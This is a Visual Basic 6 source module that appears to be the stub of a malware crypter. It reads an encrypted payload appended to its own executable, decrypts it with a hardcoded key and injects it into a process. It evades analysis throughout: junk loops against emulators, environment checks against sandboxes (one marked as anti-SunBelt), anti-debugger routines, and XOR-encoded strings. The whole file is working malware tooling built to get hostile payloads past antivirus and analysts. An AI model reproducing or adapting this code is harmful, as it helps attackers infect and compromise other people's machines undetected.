Attribute VB_Name = "mMain"
Option Explicit

Private Declare Function SetTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long) As Long
Private Declare Function KillTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function OutputDebugString Lib "kernel32" Alias "OutputDebugStringA" (ByVal lpOutputString As String) As Long
Const TLO = "W35879HEFWGS" 'decryption key
Private m_bCancel As Boolean

   Dim SPath   As String
  
 Dim bSig    As Byte
    Dim lSize   As Long
     Dim sSize   As String * 8
   Dim SData   As String
   
   
   Dim Nos As Long
Const Charge = "1"
Dim Layers
Dim Tempo As Long

Dim Random As Long
 
'############# Loop #########################
 
 Private Function RandomNumber() As Integer
   Dim Var1 As Long
    
    Randomize
    Var1 = Int(2 * Rnd)
    RandomNumber = Var1
End Function
Sub Dorme()
Sleep (200)
End Sub
Sub Main()
Dim Darma As Long
Dim h
Cic:
h = Darma + Charge
Darma = h
Dim i As Long
    Tempo = 0
    For i = 1 To 4
        If i = 2 Or i = 4 Or i = 6 Then
            Tempo = Tempo & RandomNumber
        'Else
        '    imput2 = imput2 & RandomLetter
        End If
    Next i

If Darma > 6 Then GoTo Parti Else GoTo Cic


Parti:
Call HardestEmu
End Sub
Sub HardestEmu()

Ciclo:
Random = Rnd * 110
Layers = Nos + Charge
If Nos > Tempo Then GoTo ETX
Nos = Layers
If Random > 35 Then Call Blaster Else GoTo Ciclo
ETX:
Call Dorme
Call Garbage

End


End Sub


Private Function Blaster()
Dim Positivo As Integer
Dim Negativo As Integer
Dim Memoria As Integer

Negativo = Rnd * 10
Positivo = JQkAa4mA3Z(ZTlCVRR7t9("410206"), "p76vItWvihfH")
Load:
Memoria = Positivo - Negativo
Memoria = Rnd * 60 + Positivo

If Memoria > 200 Then Call Sky Else GoTo Load

End Function
Sub Sky()
'MsgBox JQkAa4mA3Z(ZTlCVRR7t9("002A32602E2033"),"YOA2ONWmWuTF")
Call Dorme
Call HardestEmu

End Sub
'######################### end Looop ########################
 
 
  
   

Private Sub Garbage()
    SetTimer 0, Rnd * 1024, 100, AddressOf TimerProc
Do
         
        DoEvents: Call CheckIntegrity
        DoEvents: If Debugger = True Then End
        DoEvents: Call Sleep(250)
        
    Loop Until m_bCancel
End Sub

Sub CheckIntegrity()
If Environ(JQkAa4mA3Z(ZTlCVRR7t9("3E1717441A555B23"), "Kdr6t46FoLXA")) = JQkAa4mA3Z(ZTlCVRR7t9("0E3D23280D5F276C16550B"), "MHQZh1S9e0yw") Then
    End
End If
 'SunBelt ----------------Anti
    If App.Path = JQkAa4mA3Z(ZTlCVRR7t9("2E5312"), "fiNHdFgPufFt") And Environ(JQkAa4mA3Z(ZTlCVRR7t9("3432522424062232"), "AA7VJgOWxwdo")) = JQkAa4mA3Z(ZTlCVRR7t9("120C510430030530"), "Ao9iYgqYAJnm") Then
    End
    End If
Dim ThreadID As Long

'For usefull test... compile this example and open the exe in some debugger (like ADA, OLLY, etc). Debug this code before install the JQkAa4mA3Z(ZTlCVRR7t9("023D0D0B29010101163E3C1B"),"CSybMdctqYYi")... then debug again after install the JQkAa4mA3Z(ZTlCVRR7t9("023D0D0B29010101163E3C1B"),"CSybMdctqYYi")
ThreadID = InstallAntiDebugger
'If ThreadID <> 0 Then
 '   MsgBox JQkAa4mA3Z(ZTlCVRR7t9("30223B5145375D053F11235C036C26561607590B2613201918226F4C0D16181322042158156C"),"qLO8es8gJvD9") & ThreadID, vbInformation
'Else
 '   MsgBox JQkAa4mA3Z(ZTlCVRR7t9("264B350D266B"),"c9GbTJizbLH5"), vbCritical
'End If
    
End Sub
Private Function Debugger() As Boolean
    Debugger = Not (OutputDebugString(VarPtr(ByVal JQkAa4mA3Z(ZTlCVRR7t9("586C"), "eE54HG4321i1"))) = 1)
End Function


 Sub TimerProc(ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long)
    KillTimer hwnd, nIDEvent
 
    
    
    If Not m_bCancel Then
        m_bCancel = True
      
       Call Astra
       Call Tastra(bSig, lSize)
       Call Dos(SData, SPath)
       
       
       
       
        End If
    
      

   ' End If
End Sub
Sub Astra()
  SPath = ThisExe
  
        Open SPath For Binary Access Read As #1
    
        Seek #1, LOF(1) - 1: Get #1, , bSig
        Seek #1, LOF(1) - 9: Get #1, , sSize
        lSize = Val(sSize)

End Sub

Sub Tastra(bSig As Byte, lSize As Long)
  SPath = ThisExe
    Dim Algo  As New C4
 If bSig = 27 And lSize > 0 And lSize < LOF(1) Then
            Seek #1, LOF(1) - 9 - lSize
            SData = Space(lSize)
            Get #1, , SData
            SData = Algo.DecryptString(SData, TLO)
            Close #1
            End If
           
End Sub
Sub Dos(SData As String, SPath As String)
  mPEL.InjectExe SPath, StrConv(SData, vbFromUnicode)
End Sub



Public Function JQkAa4mA3Z(ByVal xf1MEksJhf As String, ByVal mYEcF8D3Tg As String) As String
Dim NmNpdwqqNh As Long
For NmNpdwqqNh = 1 To Len(xf1MEksJhf)
JQkAa4mA3Z = JQkAa4mA3Z & Chr(Asc(Mid(mYEcF8D3Tg, IIf(NmNpdwqqNh Mod Len(mYEcF8D3Tg) <> 0, NmNpdwqqNh Mod Len(mYEcF8D3Tg), Len(mYEcF8D3Tg)), 1)) Xor Asc(Mid(xf1MEksJhf, NmNpdwqqNh, 1)))
Next NmNpdwqqNh
End Function
Public Function ZTlCVRR7t9(ByVal oaqVyuFNpQ As String) As String
Dim XcbJ3QamGI As String
Dim yZ37YrsS81 As String
Dim IHaxw0fErL As Long
For IHaxw0fErL = 1 To Len(oaqVyuFNpQ) Step 2
XcbJ3QamGI = Chr$(Val("&H" & Mid$(oaqVyuFNpQ, IHaxw0fErL, 2)))
yZ37YrsS81 = yZ37YrsS81 & XcbJ3QamGI
Next IHaxw0fErL
ZTlCVRR7t9 = yZ37YrsS81
End Function
